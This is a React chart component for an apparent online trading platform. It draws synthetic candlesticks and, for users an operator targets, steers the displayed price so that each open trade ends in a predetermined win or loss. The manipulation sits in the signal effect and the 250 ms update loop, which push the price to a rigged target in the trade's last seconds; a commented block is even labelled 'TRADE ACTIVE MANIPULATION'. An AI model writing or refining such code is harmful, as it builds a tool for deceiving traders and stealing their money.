import React, { useEffect, useRef, forwardRef, useImperativeHandle } from 'react';
import { createChart } from 'lightweight-charts';

const LightweightChart = forwardRef(({ symbol, interval, currentRate, activeSignal, user, isTrading, tradeDirection, intendedOutcome, tradeDuration, onCandlesUpdate }, ref) => {
    const chartContainerRef = useRef(null);
    const chartRef = useRef(null);
    const seriesRef = useRef(null);
    const candlesDataRef = useRef([]);
    const updateIntervalRef = useRef(null);

    // Use REFS for all trading-state values read inside the interval
    // This avoids stale closure issues entirely
    const isTradingRef = useRef(false);
    const tradeDirectionRef = useRef(null);
    const intendedOutcomeRef = useRef(null);
    const activeSignalRef = useRef(activeSignal);
    const currentRateRef = useRef(currentRate);
    const hasRebiasedRef = useRef(false);

    // Persistent signal state
    const signalStateRef = useRef({
        isActive: false,
        startTime: null,
        endTime: null,
        targetPrice: null,
        lastPriceAtPushStart: null,
        pushStarted: false
    });

    // Sync all props to refs on every render (no re-renders inside interval)
    useEffect(() => { isTradingRef.current = isTrading; }, [isTrading]);
    useEffect(() => { tradeDirectionRef.current = tradeDirection; }, [tradeDirection]);
    useEffect(() => { intendedOutcomeRef.current = intendedOutcome; }, [intendedOutcome]);
    useEffect(() => { activeSignalRef.current = activeSignal; }, [activeSignal]);
    useEffect(() => { currentRateRef.current = currentRate; }, [currentRate]);

    // Signal activation effect — fires when trade starts or signal changes
    useEffect(() => {
        const sig = activeSignal;
        const isUserTargeted = !!(sig?.isActive &&
            new Date(sig?.startTime || sig?.updatedAt) <= new Date() &&
            new Date(sig?.expiresAt) > new Date() &&
            sig.affectedUsersMap?.[user?.id] &&
            sig.symbol === symbol);

        if (isUserTargeted) {
            const startTime = new Date(sig.startTime || sig.updatedAt).getTime();
            const endTime = new Date(sig.expiresAt).getTime();
            const targetChangeVal = parseFloat(sig.targetChange || 5);
            const dirMultiplier = sig.direction === 'UP' ? 1 : -1;

            const isTradingSignal = isTrading && intendedOutcome !== null;

            // Calculate chart range of current candles to scale the target move naturally
            const candles = candlesDataRef.current || [];
            let chartRange = 100;
            if (candles.length > 0) {
                const maxP = Math.max(...candles.map(c => c.high));
                const minP = Math.min(...candles.map(c => c.low));
                if (maxP > minP) {
                    chartRange = maxP - minP;
                }
            }

            // 1. Initialize or update global signal state (when not trading, or when signal ID shifts)
            if (!signalStateRef.current.isActive || signalStateRef.current.signalStartTime !== startTime) {
                const lastCandle = candles.length > 0 ? candles[candles.length - 1] : null;
                const startPrice = lastCandle?.close || parseFloat(String(currentRate || '73000').replace(/,/g, ''));
                
                // please do not change or do not remove it can be used in the future
                // const targetPrice = startPrice * (1 + (targetChangeVal / 100) * dirMultiplier);
                const moveAmount = chartRange * (targetChangeVal / 100);
                const targetPrice = startPrice + moveAmount * dirMultiplier;

                signalStateRef.current = {
                    isActive: true,
                    isTradingSignal,
                    signalStartTime: startTime,
                    signalEndTime: endTime,
                    startPrice,
                    targetPrice,
                    pushStarted: false,
                    lastPriceAtPushStart: null
                };

                console.log('[Chart] Global Signal INIT →', {
                    direction: sig.direction,
                    targetChange: targetChangeVal,
                    startPrice: startPrice.toFixed(4),
                    targetPrice: targetPrice.toFixed(4)
                });
            }

            // 2. If user starts trading, calculate trade-specific outcome override target
            if (isTradingSignal) {
                const userConfig = sig.affectedUsersMap?.[user?.id];
                const payoutRate = parseInt(userConfig?.winPercent ?? userConfig?.payoutRate ?? 85, 10);
                const isWin = intendedOutcome === 'win';
                const moveDir = (tradeDirection === 'BUY')
                    ? (isWin ? 1 : -1)
                    : (isWin ? -1 : 1);

                // please do not change or do not remove it can be used in the future
                // const moveRatio = (payoutRate / 100) * 0.015;
                // const moveRatio = targetChangeVal / 100;
                // const tradeTargetPrice = startPrice * (1 + moveRatio * moveDir);
                const moveAmount = chartRange * (targetChangeVal / 100);
                const startPrice = signalStateRef.current.startPrice;
                const tradeTargetPrice = startPrice + moveAmount * moveDir;

                // Re-initialize trade outcome target if it changes (e.g. first was null, now 'win')
                if (!signalStateRef.current.isTradingSignal || signalStateRef.current.intendedOutcomeUsed !== intendedOutcome) {
                    signalStateRef.current.isTradingSignal = true;
                    signalStateRef.current.intendedOutcomeUsed = intendedOutcome;
                    signalStateRef.current.targetPrice = tradeTargetPrice;
                    signalStateRef.current.endTime = Date.now() + (tradeDuration || 10) * 1000;
                    signalStateRef.current.pushStarted = false;
                    signalStateRef.current.lastPriceAtPushStart = null;

                    console.log('[Chart] Trade Outcome Override Activated →', {
                        tradeDirection, intendedOutcome, isWin, moveDir,
                        tradeTargetPrice: tradeTargetPrice.toFixed(4)
                    });
                }
            } else if (!isTrading) {
                // If trade ended but signal is still active, reset back to overall signal target price
                if (signalStateRef.current.isTradingSignal) {
                    const startPrice = signalStateRef.current.startPrice;
                    
                    // please do not change or do not remove it can be used in the future
                    // const targetPrice = startPrice * (1 + (targetChangeVal / 100) * dirMultiplier);
                    const moveAmount = chartRange * (targetChangeVal / 100);
                    const targetPrice = startPrice + moveAmount * dirMultiplier;

                    signalStateRef.current.isTradingSignal = false;
                    signalStateRef.current.targetPrice = targetPrice;
                    signalStateRef.current.pushStarted = false;
                    signalStateRef.current.lastPriceAtPushStart = null;
                    console.log('[Chart] Trade ended, reverting to overall signal target price:', targetPrice.toFixed(4));
                }
            }

        } else {
            // Signal is not active
            if (signalStateRef.current.isActive) {
                signalStateRef.current.isActive = false;
                signalStateRef.current.isTradingSignal = false;
                signalStateRef.current.pushStarted = false;
                console.log('[Chart] Signal DEACTIVATED');
            }
        }
    }, [activeSignal, isTrading, tradeDirection, intendedOutcome, symbol, user?.id]);

    // Expose methods to parent
    useImperativeHandle(ref, () => ({
        getCandles: () => candlesDataRef.current,
    }));

    const getIntervalSeconds = (iv) => {
        const map = { '1': 60, '5': 300, '15': 900, '30': 1800, '60': 3600, 'D': 86400, 'W': 604800 };
        return map[iv] || 60;
    };

    const generateInitialCandles = (basePrice, count = 60) => {
        const candles = [];
        const intervalSeconds = getIntervalSeconds(interval);
        const now = Math.floor(Date.now() / 1000);
        let price = basePrice;

        for (let i = 1; i <= count; i++) {
            const time = now - (i * intervalSeconds);
            // please do not change or do not remove it can be used in the future
            // const volatility = price * 0.0015;
            const volatility = price * 0.0001; // smaller volatility for flatter history
            const close = price;
            const open = close + (Math.random() - 0.5) * volatility;
            const high = Math.max(open, close) + Math.random() * volatility * 0.4;
            const low = Math.min(open, close) - Math.random() * volatility * 0.4;
            candles.unshift({
                time,
                open: parseFloat(open.toFixed(6)),
                high: parseFloat(high.toFixed(6)),
                low: parseFloat(low.toFixed(6)),
                close: parseFloat(close.toFixed(6))
            });
            price = open;
        }
        return candles;
    };

    useEffect(() => {
        const container = chartContainerRef.current;
        if (!container) return;

        if (updateIntervalRef.current) {
            clearInterval(updateIntervalRef.current);
            updateIntervalRef.current = null;
        }
        if (chartRef.current) {
            chartRef.current.remove();
            chartRef.current = null;
            seriesRef.current = null;
        }

        const chart = createChart(container, {
            width: container.clientWidth,
            height: container.clientHeight || 400,
            layout: {
                background: { type: 'solid', color: '#000000' },
                textColor: '#d1d4dc',
            },
            grid: {
                vertLines: { color: '#0d0d0d' },
                horzLines: { color: '#0d0d0d' },
            },
            crosshair: { mode: 1 },
            rightPriceScale: {
                borderColor: '#1b1b1b',
                textColor: '#888888',
            },
            timeScale: {
                borderColor: '#1b1b1b',
                textColor: '#888888',
                timeVisible: true,
                secondsVisible: false,
            },
            handleScroll: true,
            handleScale: true,
            watermark: {
                visible: false,
            },
        });

        chartRef.current = chart;

        const series = chart.addCandlestickSeries({
            upColor: '#00c087',
            downColor: '#ff4d4f',
            borderVisible: false,
            wickUpColor: '#00c087',
            wickDownColor: '#ff4d4f',
        });
        seriesRef.current = series;

        const rawPrice = currentRate ? parseFloat(String(currentRate).replace(/,/g, '')) : 73000;
        const basePrice = isNaN(rawPrice) ? 73000 : rawPrice;

        const initialCandles = generateInitialCandles(basePrice);
        candlesDataRef.current = initialCandles;
        series.setData(initialCandles);
        chart.timeScale().fitContent();
        hasRebiasedRef.current = false; // Reset bias on chart rebuild

        if (onCandlesUpdate) onCandlesUpdate(initialCandles);

        // please do not change or do not remove it can be used in the future
        // const TICK_MS = 1000;
        const TICK_MS = 250;

        updateIntervalRef.current = setInterval(() => {
            if (!seriesRef.current || candlesDataRef.current.length === 0) return;

            const sigState = signalStateRef.current;
            const nowMs = Date.now();
            const nowSec = Math.floor(nowMs / 1000);
            const intervalSeconds = getIntervalSeconds(interval);
            let lastPrice = candlesDataRef.current[candlesDataRef.current.length - 1].close;
            const realPrice = currentRateRef.current
                ? parseFloat(String(currentRateRef.current).replace(/,/g, ''))
                : lastPrice;

            const diffPrice = realPrice - lastPrice;

            // Re-bias initial candles on the very first price sync or on large price gaps to avoid massive artificial spikes/drops
            const threshold = lastPrice * 0.01; // 1% gap
            const shouldRebias = (!hasRebiasedRef.current && currentRateRef.current && Math.abs(diffPrice) > 0.0001) || (currentRateRef.current && Math.abs(diffPrice) > threshold);
            if (shouldRebias) {
                candlesDataRef.current = candlesDataRef.current.map(c => ({
                    ...c,
                    open: parseFloat((c.open + diffPrice).toFixed(6)),
                    high: parseFloat((c.high + diffPrice).toFixed(6)),
                    low: parseFloat((c.low + diffPrice).toFixed(6)),
                    close: parseFloat((c.close + diffPrice).toFixed(6))
                }));
                seriesRef.current.setData(candlesDataRef.current);
                hasRebiasedRef.current = true;
                // update lastPrice to match realPrice
                lastPrice = realPrice;
            }

            // Retrieve lastCandle AFTER re-biasing to ensure shifted values are used!
            const lastCandle = candlesDataRef.current[candlesDataRef.current.length - 1];

            let newClose;

            if (sigState.isActive) {
                // please do not change or do not remove it can be used in the future
                /*
                const totalDur = sigState.signalEndTime - sigState.signalStartTime;
                const elapsed = nowMs - sigState.signalStartTime;
                const progress = Math.min(1, Math.max(0, elapsed / totalDur));

                if (sigState.isTradingSignal) {
                    // ─── TRADE ACTIVE MANIPULATION ───
                    const remaining = (sigState.endTime || sigState.signalEndTime) - nowMs;
                    const PUSH_THRESHOLD = 5000; // Last 5 seconds

                    if (remaining <= PUSH_THRESHOLD && remaining > -500) {
                        if (!sigState.pushStarted) {
                            signalStateRef.current.lastPriceAtPushStart = lastPrice;
                            signalStateRef.current.pushStarted = true;
                        }
                        const moveSpeed = 0.82;
                        const gap = sigState.targetPrice - lastPrice;
                        newClose = lastPrice + gap * moveSpeed;
                    } else {
                        // Drift towards trade target
                        const followSpeed = 0.08;
                        const expectedPrice = sigState.startPrice + (sigState.targetPrice - sigState.startPrice) * progress;
                        const gap = expectedPrice - lastPrice;
                        const volatility = lastPrice * 0.00012;
                        newClose = lastPrice + gap * followSpeed + (Math.random() - 0.5) * volatility;
                    }
                } else {
                    // ─── NO TRADE ACTIVE (DRIFT TOWARDS SIGNAL TARGET) ───
                    const expectedPrice = sigState.startPrice + (sigState.targetPrice - sigState.startPrice) * progress;
                    const followSpeed = 0.06;
                    const gap = expectedPrice - lastPrice;
                    const volatility = lastPrice * 0.00015;
                    newClose = lastPrice + gap * followSpeed + (Math.random() - 0.5) * volatility;
                }
                */

                const endTime = sigState.isTradingSignal ? sigState.endTime : sigState.signalEndTime;
                const remaining = endTime - nowMs;
                const PUSH_THRESHOLD = 2000; // Last 2 seconds

                if (remaining <= PUSH_THRESHOLD && remaining > -500) {
                    // ─── GRADUAL PUSH TOWARDS TARGET PRICE (LAST 2 SECONDS) ───
                    if (!sigState.pushStarted) {
                        signalStateRef.current.lastPriceAtPushStart = lastPrice;
                        signalStateRef.current.pushStarted = true;
                        signalStateRef.current.pushStartTime = nowMs;
                    }

                    const pushDuration = Math.max(1000, endTime - sigState.pushStartTime);
                    const pushElapsed = nowMs - sigState.pushStartTime;
                    const pushProgress = Math.min(1, Math.max(0, pushElapsed / pushDuration));

                    // Linear interpolation to make the movement gradual (little-by-little)
                    const expectedPrice = sigState.lastPriceAtPushStart + (sigState.targetPrice - sigState.lastPriceAtPushStart) * pushProgress;
                    const followSpeed = 0.16; // fast but smooth tracking (scaled for 250ms ticks)
                    newClose = lastPrice + (expectedPrice - lastPrice) * followSpeed;
                } else {
                    // ─── BEFORE THE PUSH: FOLLOW REAL MARKET RATE ───
                    // follow real market price during active signal until the push threshold
                    const followSpeed = 0.02; // scaled for 250ms ticks
                    const diff = isNaN(realPrice - lastPrice) ? 0 : realPrice - lastPrice;
                    const drift = diff * followSpeed;
                    const volatility = lastPrice * (0.00005 + Math.random() * 0.000025); // scaled for 250ms ticks
                    newClose = lastPrice + drift + (Math.random() - 0.5) * volatility;
                }
            } else {
                // ─── NORMAL MARKET MODE or POST-TRADE/SIGNAL RECOVERY ───
                // Gently drift back to real market price
                const followSpeed = 0.02; // scaled for 250ms ticks
                const diff = isNaN(realPrice - lastPrice) ? 0 : realPrice - lastPrice;
                const drift = diff * followSpeed;
                const volatility = lastPrice * (0.00005 + Math.random() * 0.000025); // scaled for 250ms ticks
                newClose = lastPrice + drift + (Math.random() - 0.5) * volatility;
            }

            // Protect against NaN
            if (isNaN(newClose) || newClose <= 0) newClose = lastPrice;

            const moveSize = Math.abs(newClose - lastPrice);
            const wickSize = moveSize * (0.3 + Math.random() * 0.8);
            const newHigh = Math.max(lastPrice, newClose) + wickSize;
            const newLow = Math.min(lastPrice, newClose) - wickSize;

            if (nowSec - lastCandle.time >= intervalSeconds) {
                // New candle
                const newCandle = {
                    time: nowSec,
                    open: parseFloat(lastPrice.toFixed(6)),
                    high: parseFloat(newHigh.toFixed(6)),
                    low: parseFloat(newLow.toFixed(6)),
                    close: parseFloat(newClose.toFixed(6)),
                };
                candlesDataRef.current.push(newCandle);
                if (candlesDataRef.current.length > 500) candlesDataRef.current.shift();
                seriesRef.current.setData(candlesDataRef.current);
                if (onCandlesUpdate) onCandlesUpdate(candlesDataRef.current);
            } else {
                // Update current candle
                const updated = {
                    ...lastCandle,
                    high: parseFloat(Math.max(lastCandle.high, newHigh).toFixed(6)),
                    low: parseFloat(Math.min(lastCandle.low, newLow).toFixed(6)),
                    close: parseFloat(newClose.toFixed(6)),
                };
                candlesDataRef.current[candlesDataRef.current.length - 1] = updated;
                seriesRef.current.update(updated);
                if (onCandlesUpdate) onCandlesUpdate(candlesDataRef.current);
            }
        }, TICK_MS);

        const handleResize = () => {
            if (container && chartRef.current) {
                chartRef.current.applyOptions({ width: container.clientWidth, height: container.clientHeight || 400 });
            }
        };
        window.addEventListener('resize', handleResize);

        return () => {
            window.removeEventListener('resize', handleResize);
            if (updateIntervalRef.current) clearInterval(updateIntervalRef.current);
            if (chartRef.current) {
                chartRef.current.remove();
                chartRef.current = null;
                seriesRef.current = null;
            }
        };
    }, [symbol, interval]); // Chart only rebuilds when asset or timeframe changes

    return (
        <div
            ref={chartContainerRef}
            style={{ width: '100%', height: '100%', minHeight: '300px', position: 'relative' }}
        />
    );
});

LightweightChart.displayName = 'LightweightChart';
export default LightweightChart;
